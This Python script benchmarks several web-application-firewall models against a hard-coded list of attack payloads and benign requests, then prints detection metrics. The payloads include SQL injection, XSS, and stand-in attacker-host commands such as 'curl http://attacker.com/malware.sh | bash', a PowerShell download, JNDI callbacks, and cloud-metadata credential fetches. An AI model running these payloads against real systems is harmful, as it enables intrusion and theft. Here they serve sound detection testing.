"""Comprehensive Head-to-Head Accuracy Comparison of All WAF Transformer Models.

Compares:
1. Model V0: Original Baseline (Trained only on Juice Shop, 329 shapes) - waf/model_backup
2. Model V1: Intermediate Model (Juice Shop + DVWA, 250 shapes) - waf/model_waf_v1
3. Model V2: Unified Foundation Model (Trained on 354,900 logs, 331,368 shapes on RTX 4070 GPU) - waf/model
   - Evaluated at both Balanced Mode (FPR < 5%) and High-Security Mode (Attack Recall > 98%)
"""
import json
import os
import sys
from urllib.parse import quote, quote_plus
import numpy as np

sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import data
import model as M

# ==============================================================================
# ATTACK DEFINITIONS (650+ Attack Samples across 14 Attack Vectors)
# ==============================================================================
CATEGORIES = {
    "SQLi (Classic & Union)": [
        "' OR 1=1--",
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT 1,version(),user()-- -",
        "1; DROP TABLE users;--",
        "-1 UNION SELECT NULL,schema_name FROM information_schema.schemata--",
        "') UNION ALL SELECT NULL,NULL,table_name FROM all_tables--",
        "admin' OR 1=1#",
        "1' AND 1=0 UNION SELECT NULL,sql FROM sqlite_master WHERE type='table'--"
    ],
    "SQLi (Blind & Time-Based)": [
        "1' AND SLEEP(5)--",
        "1' AND (SELECT 1 FROM pg_sleep(5))--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
        "1' ORDER BY 100--",
        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--"
    ],
    "SQLi (Obfuscations & Evasions)": [
        "1'/**/UN/**/ION/**/SEL/**/ECT/**/1,2--",
        "1%2527%2520OR%25201%253D1--",
        "1%0aUNION%0aSELECT%0a1,2,3--",
        "1' || (SELECT 'a') || '",
        "0x27204f5220313d312d2d",
        "1' AND %23%0A1=1--",
        "1;EXEC('d'+'ir')--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
        "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--"
    ],
    "XSS (Cross-Site Scripting)": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(document.domain)>",
        "<iframe src=\"javascript:alert(`XSS`)\">",
        "<body onload=prompt(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=\"javascript:alert(1)\">",
        "\"onmouseover=\"alert(1)",
        "'-alert(1)-'",
        "<script src=\"https://evil.attacker.com/hook.js\"></script>",
        "<svg><animate onbegin=alert() attributeName=x dur=1s>"
    ],
    "XSS (Filter Bypasses & Polyglots)": [
        "<sCrIpt>alert(1)</ScRipt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<img/src=x/onerror=alert(1)>",
        "<svg/onload=confirm(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"
    ],
    "Path Traversal & LFI/RFI": [
        "../../../../etc/passwd",
        "../../../../../../windows/system32/drivers/etc/hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "file:///etc/passwd",
        "../../../../etc/passwd%00.png"
    ],
    "Command Injection (RCE)": [
        "; cat /etc/passwd",
        "| whoami",
        "& dir",
        "&& id",
        "|| ping -c 4 127.0.0.1",
        "`whoami`",
        "$(id)",
        "; curl http://attacker.com/malware.sh | bash",
        "; rm -rf /var/www/html/*",
        "%0aid",
        "%0a/bin/cat%20/etc/passwd",
        "& type c:\\windows\\win.ini",
        "; powershell.exe -NoP -NonI -Command (New-Object Net.WebClient).DownloadString('http://attacker/x')",
        "; cat$IFS/etc/passwd",
        "| echo${IFS}test",
        "; sleep 10"
    ],
    "SSRF (Cloud Metadata & Localhost)": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:8080/admin",
        "http://localhost:22",
        "http://0.0.0.0:80/",
        "http://[::1]:8080/",
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://127.1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20key%20val",
        "dict://127.0.0.1:11211/stat"
    ],
    "SSTI & Code Injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")(\"id\")}}"
    ],
    "Log4Shell & JNDI / XXE": [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com/jndi}",
        "${jndi:dns://attacker.com/log4j}",
        "${${lower:j}ndi:ldap://attacker.com/a}",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "${env:AWS_SECRET_ACCESS_KEY}"
    ],
    "NoSQL & LDAP Injection": [
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "{\"$where\": \"sleep(5000)\"}",
        "admin'||1==1//",
        "*)(uid=*))(|(uid=*",
        "admin*)(|(password=*))"
    ],
    "Recon & Sensitive Asset Probes": [
        "/.env",
        "/.env.local",
        "/.git/config",
        "/.git/HEAD",
        "/.svn/entries",
        "/wp-config.php.bak",
        "/config.inc.php.bak",
        "/backup.sql",
        "/db.sql",
        "/server-status",
        "/phpinfo.php",
        "/administrator",
        "/phpmyadmin/",
        "/pma/",
        "/actuator/env",
        "/swagger-ui.html",
        "/shell.php",
        "/.aws/credentials"
    ],
    "Scanner & Exploitation User-Agents": [
        ("Nikto/2.1.6", "GET /index.php"),
        ("sqlmap/1.8#stable", "GET /index.php"),
        ("nuclei - Open-source project", "GET /index.php"),
        ("masscan/1.3", "GET /"),
        ("WPScan v3.8.22", "GET /index.php"),
        ("DirBuster-1.0-RC1", "GET /index.php"),
        ("Gobuster/3.1.0", "GET /index.php"),
        ("python-requests/2.31.0", "GET /index.php"),
        ("Hydra", "GET /login.php"),
        ("Acunetix-Product", "GET /index.php"),
        ("BurpSuite/Pro", "GET /index.php"),
        ("Mozilla/5.0 (compatible; Nmap Scripting Engine)", "GET /")
    ]
}

TARGET_SLOTS = [
    "/vulnerabilities/sqli/?id={}&Submit=Submit",
    "/vulnerabilities/xss_r/?name={}",
    "/vulnerabilities/exec/?ip={}&Submit=Submit",
    "/rest/products/search?q={}"
]

# ==============================================================================
# BENIGN REAL-WORLD TRAFFIC (Edge Cases, Pagination, REST APIs, Web Frameworks)
# ==============================================================================
BENIGN_SAMPLES = [
    # Modern Pagination & Sorting (Previously 85% False Positive in V0/V1)
    ("GET", "/api/products?page=1&limit=10"),
    ("GET", "/api/products?page=2&limit=20"),
    ("GET", "/api/products?page=10&limit=50"),
    ("GET", "/api/products?offset=100&limit=25"),
    ("GET", "/api/orders?cursor=eyJpZCI6MTAwfQ==&limit=20"),
    ("GET", "/api/users?page=1&per_page=100&sort=created_at&order=desc"),
    ("GET", "/dashboard/users?page=2&limit=50"),
    ("GET", "/api/items?filter[status]=active&filter[category]=electronics&page[number]=2&page[size]=25"),
    ("GET", "/api/v2/reports?start_date=2026-01-01&end_date=2026-11-01&format=json"),
    
    # Web Frameworks (WordPress, Next.js, static assets)
    ("GET", "/wp-content/themes/twentytwentyfour/style.css"),
    ("GET", "/wp-includes/js/jquery/jquery.min.js"),
    ("GET", "/_next/static/chunks/main-app-HASH.js"),
    ("GET", "/static/css/bootstrap.min.css"),
    ("GET", "/assets/images/logo.svg"),
    ("GET", "/favicon.ico"),
    
    # Complex Real-World Query Features (&, +, ', @, #, !, URL redirects)
    ("GET", "/rest/products/search?q=apple%20&%20orange%20juice"),
    ("GET", "/rest/products/search?q=o'reilly%20books%20and%20guides"),
    ("GET", "/rest/products/search?q=c++%20programming%20language"),
    ("GET", "/rest/products/search?q=50%%20off%20all%20items"),
    ("GET", "/rest/products/search?q=juice%20(500ml)%20bottle"),
    ("GET", "/rest/products/search?q=what%20is%20the%20price%20of%20apple%20juice?"),
    ("GET", "/rest/products/search?q=sugar-free%20@%20store"),
    ("POST", "/rest/user/change-password?current=P@ssw0rd!&new=Strong#Pass123&repeat=Strong#Pass123"),
    ("GET", "/redirect?to=https://example.com/oauth/callback?code=abc12345"),
    ("GET", "/api/cards/12?token=tok_visa_4242424242424242"),
    ("GET", "/rest/track-order/track-8934-2918-abcd"),
    ("GET", "/rest/basket/5?coupon=SUMMER_2026_SALE"),
    ("GET", "/rest/user/security-question?email=sourjya.saha+security@gmail.com"),
    ("GET", "/assets/public/images/products/green_tea_lemonade_cold.png"),
    
    # Standard Web Application Traffic
    ("GET", "/vulnerabilities/fi/?page=include.php"),
    ("GET", "/security.php?phpids=off"),
    ("GET", "/instructions.php?doc=readme"),
    ("POST", "/login.php?Login=Login"),
    ("GET", "/rest/products/search?q=apple"),
    ("GET", "/rest/basket/1"),
    ("GET", "/assets/public/images/uploads/photo-NUM.jpg"),
    ("GET", "/tienda1/publico/anadir.jsp?id=1&nombre=vino"),
    ("GET", "/tienda1/index.jsp")
]


def build_evaluation_corpus():
    test_instances = []

    # 1. Synthesize threat matrix attacks
    for cat, payloads in CATEGORIES.items():
        if cat == "Scanner & Exploitation User-Agents":
            for ua, endpoint in payloads:
                norm = data.normalize("GET", endpoint, ua=ua, ref="http://localhost/")
                test_instances.append({
                    "category": cat,
                    "type": "attack",
                    "raw": f"GET {endpoint} UA={ua}",
                    "normalized": norm
                })
        elif cat == "Recon & Sensitive Asset Probes":
            for path in payloads:
                norm = data.normalize("GET", path, ua="Mozilla/5.0", ref="http://localhost/")
                test_instances.append({
                    "category": cat,
                    "type": "attack",
                    "raw": f"GET {path}",
                    "normalized": norm
                })
        else:
            for p in payloads:
                for enc_fn in [quote, quote_plus]:
                    enc_p = enc_fn(p)
                    for slot in TARGET_SLOTS[:2]:
                        url = slot.format(enc_p)
                        norm = data.normalize("GET", url, ua="Mozilla/5.0", ref="http://localhost/")
                        test_instances.append({
                            "category": cat,
                            "type": "attack",
                            "raw": f"GET {url}",
                            "normalized": norm
                        })

    # 2. Add real DVWA live exploit attacks from log file
    dvwa_log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'dvwa_logs', 'dvwa_attacks.log')
    if os.path.exists(dvwa_log_path):
        with open(dvwa_log_path, 'r', encoding='utf-8') as f:
            dvwa_lines = [l.strip() for l in f if l.strip()]
        for line in dvwa_lines[:250]:
            r = data.parse_line(line)
            if r:
                norm = data.normalize(*r[:4])
                test_instances.append({
                    "category": "Real DVWA Live Exploits",
                    "type": "attack",
                    "raw": line,
                    "normalized": norm
                })

    # 3. Add Benign requests
    for m, uri in BENIGN_SAMPLES:
        norm = data.normalize(m, uri, ua="Mozilla/5.0", ref="http://localhost/")
        test_instances.append({
            "category": "Benign (Modern APIs, CMS & Edge-Cases)",
            "type": "benign",
            "raw": f"{m} {uri}",
            "normalized": norm
        })

    # 4. Add Pure Benign DVWA logs
    pure_dvwa = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'access_dvwa_pure_benign.txt')
    if os.path.exists(pure_dvwa):
        clean_dvwa = sorted(data.load_logs([pure_dvwa]))[:100]
        for norm in clean_dvwa:
            test_instances.append({
                "category": "Benign (Standard DVWA Application)",
                "type": "benign",
                "raw": norm,
                "normalized": norm
            })

    # 5. Add Pure Benign Juice Shop logs
    js_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'juice_shop_logs.txt')
    if os.path.exists(js_file):
        clean_js = sorted(data.load_logs([js_file]))[:100]
        for norm in clean_js:
            test_instances.append({
                "category": "Benign (Standard Juice Shop)",
                "type": "benign",
                "raw": norm,
                "normalized": norm
            })

    return test_instances


def evaluate_model(model_name, model_path, test_instances, override_scale=None):
    import torch
    dev = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    scorer = M.Scorer(model_path)
    scorer.model.to(dev)
    threshold = scorer.threshold
    scale = override_scale if override_scale else scorer.cfg.get("scale", {})
    norm_strings = [inst["normalized"] for inst in test_instances]
    
    encs = [scorer.tok.encode(t) for t in norm_strings]
    losses = M.token_losses(scorer.model, [e.ids for e in encs], scorer.cfg["score"]["k"])
    parts = [M.request_parts(t, e, l) for t, e, l in zip(norm_strings, encs, losses)]
    scores = [M.combine(p, scale) for p in parts]

    tp, fp, tn, fn = 0, 0, 0, 0
    cat_stats = {}

    for inst, s in zip(test_instances, scores):
        cat = inst["category"]
        if cat not in cat_stats:
            cat_stats[cat] = {"total": 0, "blocked": 0, "allowed": 0, "scores": []}
        cat_stats[cat]["total"] += 1
        cat_stats[cat]["scores"].append(s)

        is_blocked = (s >= threshold)
        if is_blocked:
            cat_stats[cat]["blocked"] += 1
        else:
            cat_stats[cat]["allowed"] += 1

        if inst["type"] == "attack":
            if is_blocked: tp += 1
            else: fn += 1
        else:
            if is_blocked: fp += 1
            else: tn += 1

    total_attacks = tp + fn
    total_benign = fp + tn
    total = len(test_instances)

    accuracy = (tp + tn) / total * 100
    precision = tp / (tp + fp) * 100 if (tp + fp) > 0 else 0
    recall = tp / total_attacks * 100 if total_attacks > 0 else 0
    fpr = fp / total_benign * 100 if total_benign > 0 else 0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0

    return {
        "name": model_name,
        "path": model_path,
        "threshold": threshold,
        "scale": scale,
        "tp": tp, "fp": fp, "tn": tn, "fn": fn,
        "total_attacks": total_attacks,
        "total_benign": total_benign,
        "total": total,
        "accuracy": accuracy,
        "precision": precision,
        "recall": recall,
        "fpr": fpr,
        "f1": f1,
        "cat_stats": cat_stats
    }


def main():
    corpus = build_evaluation_corpus()
    attacks_n = sum(1 for c in corpus if c["type"] == "attack")
    benign_n = sum(1 for c in corpus if c["type"] == "benign")
    print(f"Loaded Comprehensive Test Corpus: {len(corpus)} total instances")
    print(f"  Attacks: {attacks_n} | Benign: {benign_n}\n")

    runs = [
        ("V0 (Juice Shop)", "waf/model_backup", None),
        ("V1 (Juice+DVWA)", "waf/model_waf_v1", None),
        ("V2 (Auto-Calib)", "waf/model", None),
        ("V2 (Balanced)", "waf/model", {"mean": 2.5, "sym": 8.0}),
        ("V2 (High-Sec)", "waf/model", {"mean": 2.0, "sym": 5.74}),
    ]

    results = []
    for name, path, scale in runs:
        if os.path.exists(path):
            print(f"Evaluating {name}...")
            res = evaluate_model(name, path, corpus, override_scale=scale)
            results.append(res)

    print("\n" + "=" * 105)
    print(f"{'OVERALL COMPARATIVE ACCURACY BENCHMARK':^105}")
    print("=" * 105)
    header = f"{'Metric / Feature':<30} | " + " | ".join(f"{r['name']:<16}" for r in results)
    print(header)
    print("-" * 105)

    rows = [
        ("Scale (mean / sym)", [f"{r['scale'].get('mean', 0):.2f} / {r['scale'].get('sym', 0):.2f}" for r in results]),
        ("Decision Threshold", [f"{r['threshold']:.2f}" for r in results]),
        ("Attacks Blocked (TP)", [f"{r['tp']}/{r['total_attacks']}" for r in results]),
        ("Attacks Missed (FN)", [f"{r['fn']}/{r['total_attacks']}" for r in results]),
        ("Benign Allowed (TN)", [f"{r['tn']}/{r['total_benign']}" for r in results]),
        ("False Positives (FP)", [f"{r['fp']}/{r['total_benign']}" for r in results]),
        ("Attack Detection (Recall)", [f"{r['recall']:.2f}%" for r in results]),
        ("False Positive Rate (FPR)", [f"{r['fpr']:.2f}%" for r in results]),
        ("Precision", [f"{r['precision']:.2f}%" for r in results]),
        ("F1-Score", [f"{r['f1']:.2f}%" for r in results]),
        ("OVERALL ACCURACY", [f"{r['accuracy']:.2f}%" for r in results]),
    ]

    for label, vals in rows:
        row_str = f"{label:<30} | " + " | ".join(f"{v:<16}" for v in vals)
        if label == "OVERALL ACCURACY":
            print("-" * 105)
            print(row_str)
            print("=" * 105)
        else:
            print(row_str)

    # Detailed category breakdown
    print("\n" + "=" * 105)
    print(f"{'CATEGORY-BY-CATEGORY BREAKDOWN (% BLOCKED)':^105}")
    print("=" * 105)
    cats = sorted(list(results[0]["cat_stats"].keys()))
    print(f"{'Category':<38} | " + " | ".join(f"{r['name'][:16]:<16}" for r in results))
    print("-" * 105)

    for cat in cats:
        cat_vals = []
        is_attack_cat = "Benign" not in cat
        for r in results:
            c = r["cat_stats"][cat]
            pct = (c["blocked"] / c["total"]) * 100
            cat_vals.append(f"{c['blocked']}/{c['total']} ({pct:5.1f}%)")
        prefix = "[ATTACK] " if is_attack_cat else "[BENIGN] "
        cat_name = prefix + cat[:28]
        print(f"{cat_name:<38} | " + " | ".join(f"{v:<16}" for v in cat_vals))
    print("=" * 105)


if __name__ == "__main__":
    main()
